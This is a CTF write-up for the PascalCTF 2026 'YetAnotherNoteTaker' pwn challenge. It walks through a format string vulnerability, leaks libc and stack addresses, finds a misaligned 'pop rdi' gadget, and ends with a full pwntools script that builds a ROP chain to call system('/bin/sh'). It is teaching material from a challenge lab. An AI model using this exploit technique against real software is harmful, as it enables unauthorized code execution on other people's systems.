---
title: PascalCTF 2026 - YetAnotherNoteTaker
date: 2026-03-02
draft: false
author: pnev
description: >-
    This one is a classic challenge when you have to pop a shell or execute another
    OS command that allows to read the `flag` file.
categories:
  - Writeups
  - Pwn
tags:
  - CTF
---

# Teh vulnerability

This one is a classic challenge when you have to pop a shell or execute another
OS command that allows to read the `flag` file. The pseudocode of the challenge
is shown below:

```c
00: int main(int argc, const char **argv, const char **envp)
01: {
02:   int menu_item;
03:   char *menu_item_str;
04:   char note[264];
05:   unsigned __int64 canary;
06:
07:   canary = __readfsqword(0x28u);
08:   init(argc, argv, envp);
09:   memset(note, 0, 256);
10:   do
11:   {
12:     menu();
13:     menu_item_str = (char *)malloc(0x10u);
14:     memset(menu_item_str, 0, 0x10u);
15:     fgets(menu_item_str, 16, stdin);
16:     sscanf(menu_item_str, "%d", &menu_item);
17:     free(menu_item_str);
18:     switch ( menu_item )
19:     {
20:       case 2:
21:         printf("Enter the note: ");
22:         read(0, note, 256);
23:         note[strcspn(note, "\n")] = 0;
24:         break;
25:       case 3:
26:         memset(note, 0, 256);
27:         puts("Note cleared.");
28:         break;
29:       case 1:
30:         printf(note);
31:         putchar('\n');
32:         break;
33:     }
34:   }
35:   while ( menu_item > 0 && menu_item <= 4 );
36:   return 0;
37: }
```

Note that we've got a format string vulnerability[1] at the line 30, and that's
the one we are going to take the advantage of.

# Teh exploitation strategy

With a format string vuln like this we can do pretty much everything: leak
memory from the stack, or write to an arbitrary address. The question is what
are we going to do with these great powers? Let's first see what binary
protection mechanisms are enabled:

```bash
$ checksec --file=notetaker
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          RW-RPATH   No RUNPATH   81 Symbols        No    0               4               notetaker
```

The important bits here are as follows:

    0. The binary is x64 (the addresses are 8 bytes long and such).
    1. `Full RELRO` - there's no writable `.plt.got` section so we can fuck off with that [2].
    2. `Canary found` - not that we care, but there are stack canaries enabled [3].
    3. `NX enabled` - the W^X mechanism is on (e.g., sections that are writable are
       non-executable, and vice versa); this essentially means we can't place any
       shellcode on the stack/heap or other interesting places [4]

    4. `No PIE` - typical, but still good - this one means you know the virtual
       addresses within the sections such as .text, .bss and others at runtime (same
       as in the binary) [3]

    5. It is also very typical to expect that `ASLR`[5] is enabled (and it often
       is), which means you can't know the base address of the stack, heap, and
       library loads at runtime.

Typically, what we want to achieve is redirecting the control flow of the
program to the `system("/bin/sh")` function that will give us the shell. With
format string vulnerabilities we can write anywhere we want so we can just
overwrite the return address of the `main()` function to point to `system()` and
that's it. However, there are the following problems:

    1. We don't know the address of the `system` function (hello `ASLR`).
    2. And even if we knew it, we can't pass arguments into `system()`.

To summarize, we can write to an arbitrary address on the heap, stack, and other
writable sections, we just don't know where and what. No matter, our friend
format string got us covered. Also, say hello to your new friends:
Return-to-libc [6], and Return-oriented programming [7].


The format strings like `%N$p` allows to print addresses right from the stack,
where `N` is the number of the positional argument to `printf()` (remember that
this function takes a variable number of arguments, and they are supposed to be
on the stack, so if there are no guardrails around the format string, we can
read the stack as far as we want).

First, we need to understand where the return address is located on the stack
(we break somewhere in `main()` and check like so):

```bash
(gdb) x/gx $rbp+0x8
0x7ffef2f087d8: 0x000078de48620840
```

Here, `0x78de48620840` is the return address (after `main()` exits, the control
flow will be redirected there), and `0x7ffef2f087d8` is the address on the stack
at which this return address is located.

Now, we need to leak this somehow. To choose the right number for the stack
memory (`N`) location(s) we want to leak, we break right before we are about to
call printf (line 30 in the pseudocode) and print the contents of the stack like
so:

```bash
                (gdb) x/64gx $rsp
6th arg --->    0x7ffef2f086b0: 0x0000000148d1d700      0x0000000001820010
                0x7ffef2f086c0: 0x0000007024333425      0x0000000000000000
                0x7ffef2f086d0: 0x0000000000000000      0x0000000000000000
                0x7ffef2f086e0: 0x0000000000000000      0x0000000000000000
                0x7ffef2f086f0: 0x0000000000000000      0x0000000000000000
                0x7ffef2f08700: 0x0000000000000000      0x0000000000000000
                0x7ffef2f08710: 0x0000000000000000      0x0000000000000000
                0x7ffef2f08720: 0x0000000000000000      0x0000000000000000
                0x7ffef2f08730: 0x0000000000000000      0x0000000000000000
                0x7ffef2f08740: 0x0000000000000000      0x0000000000000000
                0x7ffef2f08750: 0x0000000000000000      0x0000000000000000
                0x7ffef2f08760: 0x0000000000000000      0x0000000000000000
                0x7ffef2f08770: 0x0000000000000000      0x0000000000000000
                0x7ffef2f08780: 0x0000000000000000      0x0000000000000000
                0x7ffef2f08790: 0x0000000000000000      0x0000000000000000
                0x7ffef2f087a0: 0x0000000000000000      0x0000000000000000
                0x7ffef2f087b0: 0x0000000000000000      0x0000000000000000
                0x7ffef2f087c0: 0x00007ffef2f088b0      0x7a03943a2e897900 <--- 41th arg (the stack canary)
                0x7ffef2f087d0: 0x0000000000400ba0      0x000078de48620840 <--- 43rd arg (the return address)
                0x7ffef2f087e0: 0x0000000000000001      0x00007ffef2f088b8 <--- 45th arg (the 2nd argument of the main() func)
                [...]
```

Unlike `x86`, where all the `printf()` arguments are stored on the stack, on
`x64` these are pushed into the stack only starting from the sixth argument.

Eventually, we can see that the 43rd argument is an address in `libc`, and the
45th argument is an address on the stack. To confirm, we can check see the base
of the stack and libc in gdb:

```bash
(gdb) info proc mappings
process 9081
Mapped address spaces:

            Start Addr           End Addr       Size     Offset  Perms  objfile
                   0x400000           0x401000     0x1000        0x0  r-xp   /yetAnotherNoteTaker/notetaker
                   0x601000           0x602000     0x1000     0x1000  r--p   /yetAnotherNoteTaker/notetaker
                   0x602000           0x603000     0x1000     0x2000  rw-p   /yetAnotherNoteTaker/notetaker
                   0x1820000          0x1841000    0x21000       0x0  rw-p   [heap]
               [...]
libc base ---> 0x78de48600000     0x78de487c0000   0x1c0000      0x0  r-xp   /yetAnotherNoteTaker/libs/libc.so.6
               [...]
stack base ---> 0x7ffef2ee9000     0x7ffef2f0a000    0x21000     0x0  rw-p   [stack]
               [...]
```

Now, to leak these two addresses all we need to do is to craft the following
input:

```bash
1. Read note
2. Write note
3. Clear note
4. Exit
> 2
Enter the note: %43$p-%45$p
1. Read note
2. Write note
3. Clear note
4. Exit
> 1
0x78de48620840-0x7ffef2f088b8
1. Read note
2. Write note
3. Clear note
4. Exit
```

As I already mentioned, you can do arbitrary writes with format string bugs. I
am not going to explain it here, but there are great resources out there [1]. If
you are using `pwntools`, you can take advantage of the
`pwnlib.fmtstr.fmtstr_payload()`[9] function to make your life much easier. All
you need to know is the offset, the address you are about to overwrite and the
address you want to be written. To figure out the offset you should do something
like this:

```bash
> 2
Enter the note: AAAAAAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
1. Read note
2. Write note
3. Clear note
4. Exit
> 1
AAAAAAAA0x78de489c4b28-(nil)-(nil)-0x1820010-(nil)-0x148d1d700-0x1820010-0x4141414141414141-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x7025-(nil)-(nil)
```

You see, that out input (`0x4141414141414141`) appears at the 8th position, so
the offset will be `8`.

```bash
(gdb) x/gx $rbp+0x8
0x7ffef2f087d8: 0x000078de48620840
```

Keep in mind that we want to overwrite the return address `0x78de48620840`
with the address of `system()`. To do that we need to calculate a few things:

1. The address on the stack where the return address is stored. Since the stack
   layout is deterministic in a way (the base address changes between runs due
   to `ASLR`, but offsets stay the same), by leaking one stack address at a
   specific location we can reconstruct the rest. In this case, we leak the 2nd
   argument of the `main()` func - `0x7ffef2f088b8`. In gdb we can see that:
        * `0x7ffef2f088b8 - 0x7ffef2f087d8 = 0xe0`
   So to compute the stack address where the return addres will be stored,
   we need to:
        * `ret_addr_addr = 45th_arg - 0xe0`


2. The address of the `system()` function in libc at runtime. For example, the
   43rd argument of `printf()` we leaked is `0x78de48620840` - this seems to be
   some function in libc, and it can help us to determine the libc base at
   runtime. For example, by computing `0x78de48620840 - libc base` we get the
   offset `0x20840`, which happens to be an address in the `libc_main()`
   function (check the `libc.so.6` file). In order to get the address of system
   we can do:
        * `system_addr = (43rd_arg - 0x20840) + system_offset`

   The offset of the `system()` function happens to be `0x453A0` (again, check
   the `libc.so.6` file), so for the sake of this example, the virtual address
   of the `system()` function will be:
        * `system_addr = (0x78de48620840 - 0x20840) + 0x453A0 = 0x78de486453a0`

3. Ok, so we can beat the `ASLR` and redirect the control to where we want, now
   what? We still need to pass the right argument to `system()` - the "/bin/sh"
   string, and that's the tricky part!

To do that last bit, we need a way of passing the input into the program, but
with the current program that's impossible. We can still use the powerful format
string primitive, as the string "/bin/sh" happens to be present in the libc too
at the offset `0x18CE57`:

```asm
.rodata:000000000018CE57 aBinSh          db '/bin/sh',0          ; DATA XREF: sub_44E30+451â†‘o
.rodata:000000000018CE57                                         ; _IO_proc_open+306â†‘o ...
.rodata:000000000018CE5F aExit0          db 'exit 0',0           ; DATA XREF: __libc_system:loc_453B0â†‘o
.rodata:000000000018CE66 aCanonicalizeC  db 'canonicalize.c',0   ; DATA XREF: realpath_0+55Dâ†‘o
```

You guess it, we can compute the address of this string in the virtual memory in
the same way we computed the address of `system()` ;-)

There's one last thing in the way: how do we pass that string address as an
argument to `system()`?

First off, remember that `system()` takes only one argument, which should be a
pointer to a string (e.g., `char *`) and that in `x64` the first argument must
be located in the `rdi` register [8]. To achieve that we can use a bit of
Return-oriented programming [7] and place the pointer to "/bin/sh" on the stack,
then pop it, and return `system()`, so we should do something like:

```asm
    pop  rdi     <--- gets the address of "/bin/sh" off the stack and puts it into rdi
    pop  rax     <--- pops the return address off the stack
    call rax     <--- calls it
```

The problem is, there are no such gadgets that pop the rdi register. The closest
we can find at first is this:

```asm
.text:0000000000400BF6 loc_400BF6:
.text:0000000000400BF6                 add     rsp, 8
.text:0000000000400BFA                 pop     rbx
.text:0000000000400BFB                 pop     rbp
.text:0000000000400BFC                 pop     r12
.text:0000000000400BFE                 pop     r13
.text:0000000000400C00                 pop     r14
.text:0000000000400C02                 pop     r15
.text:0000000000400C04                 retn
.text:0000000000400C04 ; } // starts at 400BA0
.text:0000000000400C04 __libc_csu_init endp
```

Fret not, there's a neat trick that's possible because the `x64` instructions
are variable length:

```bash
(gdb) x/4i 0x400c02
   0x400c02 <__libc_csu_init+98>:       pop    r15
   0x400c04 <__libc_csu_init+100>:      ret
   0x400c05:    nop
   0x400c06:    cs nop WORD PTR [rax+rax*1+0x0]

(gdb) x/4i 0x400c03
   0x400c03 <__libc_csu_init+99>:       pop    rdi
   0x400c04 <__libc_csu_init+100>:      ret
   0x400c05:    nop
   0x400c06:    cs nop WORD PTR [rax+rax*1+0x0]
```

See what I did there? By flipping one byte (02 to 03) I changed the semantics of
`pop r15` into `pop rdi` - isn't that a neat trick?

Anyway, we now have all the parts we need, so here's what we are going to do:

1. Leak the libc and the stack addresses (43rd and 45th args).
2. Compute the libc base, then the address of `system()` and the "/bin/sh"
   string. Compute the address of `main()` return address.
3. Place the address of the `pop rdi; retn` gadget on the stack, in place of the
   original return address. Place the pointer to "/bin/sh" next (retaddr+8), and
   the address of `system()` just after that (retaddr+16).
4. Exit main to trigger the ROP chain. Read the flag :-)


# The exploit script

```python
from pwn import *
context.arch = "amd64"

p = "./yetAnotherNoteTaker/notetaker"
io = process(p)
'''
io = gdb.debug(p, """
    b *0x400b94
    continue
""")
'''

io.recv()

io.sendline(b"2")
io.recv()
io.sendline(b"%43$p-%45$p")
io.recv()

io.sendline(b"1")
out = io.recv().decode()
print(out)
addrz = out.split("\n")[0]
libc_leak = int(addrz.split("-")[0], 16)
stack_leak = int(addrz.split("-")[1], 16)

libc_base = libc_leak - 0x20840
system = libc_base + 0x453a0
binsh = libc_base + 0x18ce57
retaddr = stack_leak - 0xe0
gadgetaddr = 0x400c03

print(f"SYSTEM: {hex(system)}")
print(f"BINSH: {hex(binsh)}")
print(f"RETADDR: {hex(retaddr)}")

# overwrite the return address with the ROP gadget
fmt_payload = pwnlib.fmtstr.fmtstr_payload(8, {retaddr:gadgetaddr})
io.sendline(b"2")
io.recv()
io.sendline(fmt_payload)
io.recv()

io.sendline(b"1")
out = io.recv()
print(out)

# put the first argument to system ("/bin/sh") on the stack
fmt_payload = pwnlib.fmtstr.fmtstr_payload(8, {retaddr+8:binsh})
io.sendline(b"2")
io.recv()
io.sendline(fmt_payload)
io.recv()

io.sendline(b"1")
out = io.recv()
print(out)

# put the address of system on the stack
fmt_payload = pwnlib.fmtstr.fmtstr_payload(8, {retaddr+16:system})
io.sendline(b"2")
io.recv()
io.sendline(fmt_payload)
io.recv()

io.sendline(b"1")
out = io.recv()

#---------------
# exit main and execute the ROP
#---------------
io.sendline(b"5")
out = io.recv()

#---------------
# do "cat flag"
#---------------
io.interactive()
```


# References

[1] https://cs155.stanford.edu/papers/formatstring-1.2.pdf
[2] https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro
[3] https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage
[4] https://en.wikipedia.org/wiki/W%5EX
[5] https://en.wikipedia.org/wiki/Address_space_layout_randomization
[6] https://en.wikipedia.org/wiki/Return-to-libc_attack
[7] https://en.wikipedia.org/wiki/Return-oriented_programming
[8] https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame
[9] https://docs.pwntools.com/en/dev/fmtstr.html
